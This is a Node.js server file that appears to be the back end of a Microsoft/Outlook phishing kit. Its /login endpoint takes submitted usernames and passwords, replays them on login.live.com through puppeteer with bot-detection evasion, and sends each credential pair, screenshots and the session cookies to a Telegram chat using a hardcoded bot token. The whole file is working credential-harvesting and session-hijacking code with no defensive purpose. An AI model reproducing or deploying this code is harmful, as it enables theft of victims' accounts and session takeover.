const express = require('express');
const puppeteer = require('puppeteer-extra')
const fs = require('fs');
const cors = require('cors');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const token = '5051297224:AAETgLhNRTbhpJNucj4Ny4y_czF0M3UnllY';
const chatId = '-772522345';
const bot = new TelegramBot(token, { polling: false });

const app = express();

app.use(cors());



// add stealth plugin and use defaults (all evasion techniques)
const StealthPlugin = require('puppeteer-extra-plugin-stealth')
puppeteer.use(StealthPlugin())

puppeteer.launch({ headless: true }).then(async browser => {

  const page = await browser.newPage()
  // Set a custom user agent
await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36');

app.use(cors());

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.post('/login', async (req, res) => {

  if (res.headersSent) {
    return; // Exit the function if headers have been sent
  }

  console.log("Loading Server")
  const { username, password } = req.body;  

  // BYpaSS CHROME BOT DETECTION
  await page.evaluateOnNewDocument(() => {
    // Pass the Webdriver Test.
    Object.defineProperty(navigator, 'webdriver', {
      get: () => false,
    });
   // Pass the Chrome Test.
    // We can mock this in as much depth as we need for the test.
    window.navigator.chrome = {
        runtime: {},
    };
      // Pass the Permissions Test.
      const originalQuery = window.navigator.permissions.query;
      return (window.navigator.permissions.query = (parameters) =>
        parameters.name === 'notifications'
          ? Promise.resolve({ state: Notification.permission })
          : originalQuery(parameters));
  
      // Etc., add more customizations if necessary
    });


    await page.goto('https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1687265731&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f0%2f%3fstate%3d1%26redirectTo%3daHR0cHM6Ly9vdXRsb29rLmxpdmUuY29tL21haWwvMC8%26nlp%3d1%26RpsCsrfState%3dc031da47-5726-856c-5a83-bed0b62e7cc8&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015')
    await page.waitForTimeout(2000)

    console.log(username)
          // Paste the user ID
    await page.type('input[name="loginfmt"]', username);

    // Click on the button with class name 'next-button'
    await page.click('#idSIButton9');

    await page.waitForTimeout(3000)

    const currentURL = page.url();
    // console.log('Current URL:', currentURL);
      // console.log(isElementPresent)
      // console.log('Account Valid')

    const imagePath = 'shots.png';


    try {
      await Promise.all([
        page.waitForNavigation(), // Wait for navigation to complete
        // page.click('#myButton') // Replace with the selector of the button or element that triggers navigation
      ]);
  
      bot.sendMessage(chatId, `EMAIL:- ${username} , VALIDPASSWORD:- ${password}`)
      .then(() => {
        // console.log('Message sent successfully');
      })
      .catch((error) => {
        // console.error('Error sending message:', error);
      });
    
      await page.screenshot({ path: 'shots.png', fullPage: true })

      bot.sendPhoto(chatId, imagePath)
      .then(() => {
        // console.log('Image sent successfully');
      })
      .catch((error) => {
        console.error('Error sending image:', error);
      });
      console.log('Page navigation is complete');
      return
      // Continue with further actions or logic here
    } catch (error) {
      console.log('Page did not navigate');
      // Continue with further actions or logic when navigation does not occur
    }


    // console.log('Page navigation is complete');
    // Continue with further actions or logic here

    const isElementPresent = await page.evaluate(() => {
      const element = document.querySelector('#usernameError');
      return !!element;
    });

    // console.log('Current URL:', currentURL);

    await page.screenshot({ path: 'shots.png', fullPage: true })

    // bot.sendPhoto(chatId, imagePath)
    // .then(() => {
    //   // console.log('Image sent successfully');
    // })
    // .catch((error) => {
    //   console.error('Error sending image:', error);
    // });

   
    if(isElementPresent){

      bot.sendMessage(chatId, `ACCOUNT NOT VALID ON MICROSOFT LOGIN - EMAIL:- ${username} , PASSWORD:- ${password}`)
      .then(() => {
        // console.log('Message sent successfully');
      })
      .catch((error) => {
        // console.error('Error sending message:', error);
      });
      res.json({ notValidOnMsoft: 'false' });

      console.log(isElementPresent)
      console.log('Account Invalid')
      const imagePat = 'shots.png';

     await page.screenshot({ path: 'shots.png', fullPage: true })


      // bot.sendPhoto(chatId, imagePat)
      // .then(() => {
      //   // console.log('Image sent successfully');
      // })
      // .catch((error) => {
      //   console.error('Error sending image:', error);
      // });

      return
    }else {
      // bot.sendPhoto(chatId, imagePath)
      // .then(() => {
      //   // console.log('Image sent successfully');
      // })
      // .catch((error) => {
      //   console.error('Error sending image:', error);
      // });
    }

    await page.waitForTimeout(2000)
  
    // await page.type('input[name="passwd"]', password);
    async function typePassword(page, password) {
      try {
        console.log(password)
        await page.type('input[name="passwd"]', password);
      } catch {
        await page.click('#idA_PWD_SwitchToPassword');
    await page.waitForTimeout(2000)
        await page.type('input[name="passwd"]', password);
      }
    }

    typePassword(page, password);

    await page.screenshot({ path: 'shots.png', fullPage: true })

    const imagePat = 'shots.png';
  
    // Send the image
    bot.sendPhoto(chatId, imagePat)
          .then(() => {
            // console.log('Image sent successfully');
          })
          .catch((error) => {
            console.error('Error sending image:', error);
    }); 


    await page.click('#idSIButton9');

    await page.waitForTimeout(3000)
    // await page.waitForNavigation(3000);
    const isPasswErr = await page.evaluate(() => {
      const element = document.querySelector('#passwordError');
      return !!element;
    });

    if(isPasswErr){
      bot.sendMessage(chatId, `EMAIL:- ${username} , InvaliDPASSWORD:- ${password}`)
      .then(() => {
        // console.log('Message sent successfully');
      })
      .catch((error) => {
        // console.error('Error sending message:', error);
      });
      res.json({ dataMsg: 'false' });
      console.log('invalid Password')
    } else {
    res.json({ dataMsg: 'true' });
    bot.sendMessage(chatId, `ACCOUNT MICROSOFT LOGIN - EMAIL:- ${username} , PASSWORD:- ${password}`)
    .then(() => {
      // console.log('Message sent successfully');
    })
    .catch((error) => {
      // console.error('Error sending message:', error);
    });
      console.log('Valid Password')
    }


    async function clickButton(page) {
      const button = await page.$('#idSIButton9');
      if (button) {
        await button.click();
      } else {
        console.log('Button not found');
      }
    }
    try {  
      await clickButton(page);
    } catch (error) {
      await page.screenshot({ path: 'shots.png', fullPage: true })

      const imagePa = 'shots.png';
    
      // Send the image
      bot.sendPhoto(chatId, imagePa)
            .then(() => {
              // console.log('Image sent successfully');
            })
            .catch((error) => {
              console.error('Error sending image:', error);
      });
      console.error('Error occurred while clicking the button:');
      // return
    }



  const element = await page.$('#idDiv_SAOTCS_Title'); // returns null if element is not found

  if (element) {
    
    // const text = `Email ${username}`;
    // const element = await page.$x(`//*[contains(text(), "${text}")]`);
  
    // if (element.length > 0) {
    //   await element[0].click();
    //   console.log(`Clicked on the element containing "${text}".`);
    //   res.json({ collectCode: 'false' });

    // } else {
    //   console.log(`No element containing "${text}" found on the page.`);
    // }

    await page.waitForTimeout(3000)
    
    await page.screenshot({ path: 'shots.png', fullPage: true })

    const imagePa = 'shots.png';
  
    // Send the image
    bot.sendPhoto(chatId, imagePa)
          .then(() => {
            // console.log('Image sent successfully');
          })
          .catch((error) => {
            console.error('Error sending image:', error);
    }); 

    return
  } else {
    console.log('Element does not exist!');
  }

    await page.waitForTimeout(4000)

    try {
      await Promise.all([
        page.waitForNavigation(), // Wait for navigation to complete
        // page.click('#myButton') // Replace with the selector of the button or element that triggers navigation
      ]);
    console.log('Page navigation is complete');
    // Continue with further actions or logic here
  } catch (error) {
    console.log('Page did not navigate');
    // return
    // Continue with further actions or logic when navigation does not occur
  }
  await page.waitForTimeout(5000)

  const cookies = await page.cookies();

  const cook = JSON.stringify(cookies)
    // Write cookies to a text file
  fs.writeFile('cookies.txt', JSON.stringify(cookies), function (err) {
  if (err) throw err;

  // Read the .txt file
const filePath = 'cookies.txt';
// Create a readable stream from the file
const fileStream = fs.createReadStream(filePath);

// Send the .txt file as a document
bot.sendDocument(chatId, fileStream)
  .then(() => {
    console.log('File sent successfully');
  })
  .catch((error) => {
    console.error('Error sending file:', error);
  });
  // console.log('Cookies saved to cookies.txt');
  });

    await page.screenshot({ path: 'shots.png', fullPage: true })

    const imagePathv = 'shots.png';
  
    // Send the image
    bot.sendPhoto(chatId, imagePathv)
          .then(() => {
            // console.log('Image sent successfully');
          })
          .catch((error) => {
            console.error('Error sending image:', error);
    }); 
  })


// END OF PUPPETEER SESSION
})


const port = 3006;

// app.get('/', (req, res) => {
//   res.send('Hello, World!');
// });

app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});
